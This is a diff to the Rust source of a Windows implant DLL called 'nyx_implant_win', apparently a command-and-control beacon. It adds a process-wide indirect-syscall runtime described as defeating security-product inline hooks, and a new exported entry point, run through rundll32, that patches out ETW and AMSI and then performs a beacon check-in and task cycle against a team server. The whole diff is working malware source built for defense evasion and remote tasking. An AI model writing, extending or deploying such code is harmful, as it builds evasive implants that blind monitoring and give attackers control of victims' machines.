@@ -33,8 +33,11 @@ pub unsafe extern "system" fn nyx_entry() {
 
     // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs
     //    (now over a FRESH KnownDlls\ntdll map when available — defeats inline
-    //    hooks; falls back to the hooked ntdll otherwise).
-    let _syscall_rt = crate::syscalls::Runtime::init();
+    //    hooks; falls back to the hooked ntdll otherwise). Installed into the
+    //    process-wide global so the file/shell/sleep callers borrow one runtime
+    //    instead of each rebuilding it. This lights up G7: every NT call the
+    //    beacon makes now executes from inside ntdll.
+    crate::syscalls::init_global();
 
     // 3. Blind ETW (always present in ntdll) + best-effort AMSI (amsi.dll is
     //    usually not loaded yet; the beacon loop retries it each cycle). Done
@@ -44,6 +47,32 @@ pub unsafe extern "system" fn nyx_entry() {
 
     // 4. Enter the beacon loop (WinHTTP check-in + task loop).
     crate::beacon::beacon_loop();
+}
+
+/// **Integration-test entry**: resolves ntdll + primes the indirect-syscall
+/// runtime + blinds, then runs ONE beacon check-in + task cycle against the
+/// configured server and exits with a status. Invoke via
+/// `rundll32 nyx_implant_win.dll,nyx_beacon_oneshot` while the team server is
+/// running. See `beacon::beacon_oneshot` for exit-code meanings.
+#[no_mangle]
+pub unsafe extern "system" fn nyx_beacon_oneshot() {
+    let Some(ntdll) = LiveNtdll::locate() else {
+        unsafe { core::hint::spin_loop() };
+        return;
+    };
+    let _ssn_table = ntdll.resolve_table_owned();
+    crate::syscalls::init_global();
+    let _ = crate::blind::patch_etw();
+    let _ = crate::blind::patch_amsi();
+    let code = crate::beacon::beacon_oneshot();
+    // Exit with the status code so the harness can read %ERRORLEVEL%.
+    if let Some(addr) = crate::resolve::export_addr(b"kernel32.dll", b"ExitProcess") {
+        let f: extern "system" fn(u32) -> ! = core::mem::transmute(addr);
+        f(code);
+    }
+    loop {
+        core::hint::spin_loop();
+    }
 }
 
 /// **Self-test entry** (benign validation). Resolves ntdll, builds the SSN
@@ -116,7 +145,7 @@ pub unsafe extern "system" fn nyx_selftest() {
     // 0xE01: crypto round-trip OK. If an echo server is listening on 8443,
     // continue to the transport test; otherwise report success and exit.
     let payload: [u8; 8] = [0xDE, 0xAD, 0xBE, 0xEF, 0x01, 0x02, 0x03, 0x04];
-    match crate::transport::post_frame(b"127.0.0.1", 8443, b"/beacon", &payload) {
+    match crate::transport::post_frame(b"127.0.0.1", 8443, b"/beacon", &payload, false) {
         Some(resp) => {
             if resp.len() == payload.len() && resp.as_slice() == payload.as_slice() {
                 report_exit(exit_proc, 0xF07); // transport + crypto both OK
